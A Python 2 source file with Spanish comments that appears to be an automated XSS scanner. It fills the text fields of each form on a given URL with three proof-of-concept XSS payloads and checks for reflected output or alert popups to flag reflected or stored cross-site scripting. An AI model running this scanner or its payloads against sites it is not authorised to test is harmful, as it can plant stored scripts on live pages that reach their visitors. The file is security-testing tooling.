import sys
import os
import time
import links
import mechanize
import selenium
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoAlertPresentException

blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.gif', '.svg',
             '.pdf', '.doc', '.docx', '.zip', '.rar']

payloads = ['<script>alert(1)</script>', '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', 'javascript:alert(1)']

def detectar_xss_reflejado(br, payload):
    if payload in br.response().read(): #TODO: XSS reflejado
        #print "XSS"
        #br.back()
        return True
    #br.back()
    return False

def detectar_xss_almacenado(driver, parametro, payload):
    #entradas = driver.find_elements_by_xpath("//input") #TODO: tipo de texto
    #entradas = driver.find_elements_by_tag_name('input')
    #print entradas.tag_name, len(entradas)
    #inputElement = driver.find_element_by_id(parametro.id)
    #encontrado = False
    #print str(entradas)#, entradas
        #print driver.current_url
    parametro.send_keys(payload)
    parametro.submit()
    try:
        WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                    'Timed out waiting for PA creation ' +
                                    'confirmation popup to appear.')
        #os.system('pause')
        driver.switch_to.alert.accept()
        print('XSS STORED')
        return True
    #    os.system('pause')
    except NoAlertPresentException:
        return False
    except TimeoutException: #TODO mejorar aca
        return False
    except:
        return False
    #finally:
        #driver.execute_script("window.history.go(-1)")
        #return True
    

def inyectar_payload(br, payload, parametro): #NO hace falta determinar si es get o post.
    br.form[parametro.name] = payload
    br.submit()

def buscar_vulnerabilidad_xss(url, cookies=None):
    for extension in blacklist:
        if extension in url:
            return False
    
    #driver = webdriver.Firefox()
    #driver.get(url)
    #if cookies is not None:
    #    driver.manage().addCookie(cookies)
    br = mechanize.Browser()  # initiating the browser
    br.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
    br.set_handle_robots(False)
    br.set_handle_refresh(False)

    driver = webdriver.Firefox()    #PhantomJS 
    driver.get(url)
    if cookies is not None:
        driver.manage().addCookie(cookies)
    
    if not links.abrir_url_en_navegador(br, url, cookies):
        print "Error al abrir la URL."
        if cookies is not None:
            print "Revise las cookies."
        return False

    i = 0
    
    forms = br.forms() 
    for form in forms:     # if a form exists, submit it
        #params = form#list(br.forms())[0]    # our form
        br.select_form(nr=i)    # submit the first form
        controls = form.controls
        for parametro in controls:
            #print str(parametro)
            #par = str(p)
            # submit only those forms which require text
            if 'TextControl' in str(parametro) or 'TextareaControl' in str(parametro):
                print parametro.name, parametro.type, parametro.id
                p = 0
                encontrado = False
                while p < len(payloads) and not encontrado:
                    #print parametro.name
                    #os.system('pause')
                    payload = payloads[p]
                    inyectar_payload(br, payload, parametro)
                    if detectar_xss_reflejado(br, payload):
                        #TODO log, bdd, etc.
                        print "XSS encontrado: ",
                        encontrado = True
                        br.back() #TODO: Ver si srive afuera del if anterior este bloque
                        br.select_form(nr=i)
                        if detectar_xss_reflejado(br, payload):
                            print "Stored"      #XSS encontrado al inyectar payload y luego de esto
                        else:
                            print "Reflejado"   #XSS encontrado solo al inyectar payload 
                    else:
                        input = driver.find_element_by_id(parametro.id)
                        if detectar_xss_almacenado(driver, input, payload):
                            encontrado = True
                        br.back()
                        br.select_form(nr=i)
                        #TODO: setup.py con selenium
                    p += 1
                    #else:
                    #    br.back()
                    #    br.select_form(nr=i)
                        


        i += 1
        #print i

if __name__ == '__main__':
    url = sys.argv[1]
    if not links.es_url_valida(url): #TODO: chequear url antes de la lista o cuando se va a hacer lo de xss?
        sys.exit("Esquema de URL invalido. Ingrese nuevamente.")
    if not links.se_puede_acceder_a_url(url):
        sys.exit("No se puede acceder a la URL. Revise la conexion o el sitio web.")
    #urls_encontradas = links.obtener_links_validos_desde_url(sys.argv[1])
    
    #for url in urls_encontradas:
    buscar_vulnerabilidad_xss(url)
        #detectar_xss_almacenado(url)


